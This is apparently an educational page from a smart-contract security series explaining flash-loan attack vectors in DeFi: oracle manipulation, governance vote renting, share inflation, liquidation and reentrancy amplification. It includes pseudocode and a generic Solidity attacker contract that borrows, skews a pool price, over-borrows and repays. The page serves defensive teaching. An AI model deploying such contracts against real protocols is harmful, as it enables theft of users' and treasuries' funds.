# SC07: Flash Loan Attacks - Attack Vectors

## Table of Contents

- [Understanding Flash Loan Attack Vectors](#understanding)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Anatomy of an Attacker Contract](#attacker-contract)
- [Chaining Weaknesses with Flash Capital](#chaining)

## Understanding Flash Loan Attack Vectors

**&#9888; EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in protocols you own or are authorised to test.

A flash-loan attack is not a single payload; it is a **composition**. The attacker writes one contract whose function borrows a large sum, calls into the victim while some shared state is distorted, and repays the loan before the transaction ends. Every step happens inside one atomic transaction, so the attacker can simulate the whole thing off-chain first and only submit it when it is guaranteed profitable. An attempt that would lose money simply reverts, costing only gas.

The attacker's goal is always to find a mechanism in the victim that **trusts a value they can move with borrowed capital**—a spot price, a live token balance, a share ratio, or a callback—and then move it far enough to extract value.

### Core Attack Flow

```
1. Borrow (huge, uncollateralised, one tx)
   &darr;
   flashLoan(token, hugeAmount) triggers attacker's callback
2. Manipulate
   &darr;
   Skew an AMM pool's spot price, inflate a vote balance, or oversize a deposit
3. Extract
   &darr;
   Borrow / mint / redeem / vote / liquidate against the victim at the bad state
4. Unwind + Repay
   &darr;
   Reverse the manipulation, repay loan + fee; keep the surplus
   (If surplus < fee, the whole tx reverts: attacker risks only gas)
```

## Common Attack Patterns

### 1. Spot-Price Oracle Manipulation

The victim prices an asset from the current reserves of one AMM pool. The attacker crashes or spikes that ratio with a flash-funded swap, then transacts against the victim at the false price.

```
// Victim's naive price source:
function getPrice() public view returns (uint) {
    return pool.reserveQuote() * 1e18 / pool.reserveBase();  // SPOT = skewable
}

// Attacker, in one tx:
//   flashBorrow(base, 50_000_000e18);
//   pool.swapExactBaseForQuote(50_000_000e18);  // base price collapses
//   victim.borrow(maxAgainst(base));            // over-borrows at fake price
//   pool.swapQuoteForBase(...);                 // restore reserves
//   flashRepay(base, 50_000_000e18 + fee);
```

**Payoff**: the victim issues far more debt / synthetic tokens than the real collateral is worth. See SC02 for the oracle root cause.

### 2. Governance Vote Manipulation

Voting power is read from the caller's current balance. The attacker flash-borrows governance tokens, votes, and repays—renting a controlling stake for one transaction.

```
// Vulnerable tally:
uint weight = govToken.balanceOf(msg.sender);   // live balance = flash-inflatable

// Attacker one tx:
//   flashBorrow(gov, quorumAmount);
//   governance.castVote(proposalId, FOR);       // borrowed weight decides it
//   governance.execute(proposalId);             // if no timelock, executes now
//   flashRepay(gov, quorumAmount + fee);
```

**Payoff**: an attacker with no lasting stake passes or blocks a proposal—draining a treasury or authorising a malicious parameter change.

### 3. Draining via Logic / Accounting Errors

A vault computes share price or rewards with a formula that rounds or scales in the caller's favour. Harmless at retail size; a full drain at flash scale.

```
// First-depositor / share-inflation style bug:
//   attacker deposits 1 wei -> mints 1 share
//   flash-donates a huge amount directly to the vault -> share price explodes
//   a later depositor's rounding is captured by the attacker's single share
//   attacker redeems, taking the victim's deposit; unwinds and repays
```

**Payoff**: the pool's reserves are transferred to the attacker in one transaction. See SC03 for the logic root cause.

### 4. Liquidation Manipulation

By moving the reference price, the attacker forces a healthy position underwater and liquidates it for the bonus—or shields their own position from a fair liquidation.

```
// Move the oracle price down with a flash swap, then:
lending.liquidate(victimPosition);   // seized at a discount that shouldn't apply
// restore price, repay flash loan, keep the liquidation bonus
```

**Payoff**: theft of a solvent user's collateral, or evasion of legitimate liquidation, both funded by borrowed capital.

### 5. Collateral / Debt Manipulation

Inflating the price of a collateral asset lets the attacker mint under-collateralised debt or an over-issued stablecoin against it.

```
// Spike collateral price with a flash swap, borrow the max against it,
// let the price revert -> the protocol is left holding bad debt.
```

**Payoff**: the protocol absorbs unrepayable debt that persists after the transaction ends.

### 6. Reentrancy Amplification

A flash loan multiplies the value a reentrancy bug can steal per callback. Each re-entered withdrawal now moves borrowed-scale amounts.

```
// Victim sends funds before updating balances (SC05):
//   attacker deposits flash-borrowed capital
//   withdraw() -> external call re-enters withdraw() before balance is zeroed
//   loop drains far more than the attacker's real balance
//   repay flash loan from the proceeds
```

**Payoff**: a reentrancy drain sized to borrowed capital rather than the attacker's own funds. See SC05.

### 7. Arbitrage-Based Value Extraction

Where two venues disagree on price, flash capital captures the entire spread in one shot—sometimes the mechanism that realises a manipulation, sometimes the profit engine bolted onto one of the patterns above.

```
// buy cheap on venue A with flash capital, sell dear on venue B, repay loan,
// keep the full spread instead of the small slice self-funding would allow.
```

## Anatomy of an Attacker Contract

Almost every flash-loan exploit is a single contract implementing the lender's callback interface. The lender sends the funds, invokes the callback, and checks repayment when the callback returns. All the malicious logic lives in that callback.

```
// SPDX-License-Identifier: MIT
// EDUCATIONAL: illustrates the attacker shape so you can defend against it.
pragma solidity ^0.8.20;

interface IFlashLender { function flashLoan(uint amount, bytes calldata data) external; }
interface IPool { function swap(uint amountIn, bool baseForQuote) external returns (uint); }
interface IVictim { function borrow(uint amount) external; function collateralToken() external view returns (address); }
interface IERC20 { function transfer(address,uint) external returns (bool); function approve(address,uint) external returns (bool); function balanceOf(address) external view returns (uint); }

contract FlashAttacker {
    IFlashLender lender;
    IPool pool;
    IVictim victim;
    address owner;

    constructor(address _lender, address _pool, address _victim) {
        lender = IFlashLender(_lender);
        pool   = IPool(_pool);
        victim = IVictim(_victim);
        owner  = msg.sender;
    }

    // 1) Kick off the atomic attack.
    function attack(uint amount) external {
        require(msg.sender == owner, "not owner");
        lender.flashLoan(amount, "");   // lender will call onFlashLoan()
    }

    // 2) Lender calls back here WITH the borrowed funds in this contract.
    function onFlashLoan(uint amount, uint fee) external {
        require(msg.sender == address(lender), "only lender");

        // --- MANIPULATE: skew the spot price the victim trusts ---
        pool.swap(amount, true);                 // dump base -> price of base crashes

        // --- EXTRACT: interact with the victim at the false price ---
        victim.borrow(amount);                   // over-borrows against mispriced base

        // --- UNWIND: reverse the swap to restore reserves ---
        pool.swap(pool_balance_quote(), false);  // quote -> base

        // --- REPAY: return principal + fee; leftover stays as profit ---
        IERC20 t = IERC20(victim.collateralToken());
        t.transfer(address(lender), amount + fee);
        // If this contract cannot cover amount+fee, the WHOLE tx reverts.
    }

    function pool_balance_quote() internal view returns (uint) { return 0; /* illustrative */ }

    // 3) Sweep the profit out after a successful atomic run.
    function withdraw(address token) external {
        require(msg.sender == owner, "not owner");
        IERC20 t = IERC20(token);
        t.transfer(owner, t.balanceOf(address(this)));
    }
}
```

**Key observation for defenders**: the victim's `borrow()` executed against a price that only existed *inside this transaction*. Nothing in the attacker contract is exotic—the exploit exists entirely because the victim trusted a value the attacker could move with borrowed capital.

## Chaining Weaknesses with Flash Capital

Individually survivable weaknesses combine into a full drain once flash capital is added:

```
Spot-price oracle (SC02)          -> skew price with a flash-funded swap
        +
Over-borrow allowed at that price  -> extract mispriced debt
        +
No deviation / circuit breaker     -> nothing halts the anomalous swing
        =  protocol insolvency, one transaction, attacker risks only gas
```

Another common chain:

```
Balance-based voting (no snapshot) -> flash-borrow governance tokens to reach quorum
        -> pass a proposal that sends the treasury to the attacker
        -> no timelock, so it executes in the SAME transaction
        -> repay the loan from the stolen treasury
```

## Key Takeaways

1. **The loan is the amplifier, not the exploit**—every vector above targets a value the victim trusts and the attacker can move with borrowed capital.
2. **It is one atomic contract**—borrow, manipulate, extract, repay, all in a callback that reverts if unprofitable.
3. **Spot prices and live balances are the top targets**—anything read from the current block can be distorted for one transaction.
4. **Risk-free attempts mean constant probing**—bots simulate these continuously and submit only guaranteed-profitable runs.
5. **Small weaknesses chain**—an oracle plus a missing circuit breaker, or balance-voting plus no timelock, equals a full drain.

## Next Steps

- **Prevention Guide**: Design assuming infinite one-tx capital
- **Code Examples**: Vulnerable vs. secure Solidity, side by side
- **Smart Contract Learning Path**: Continue the OWASP Smart Contract Top 10
- **Practice**: Apply what you've learned in hands-on challenges
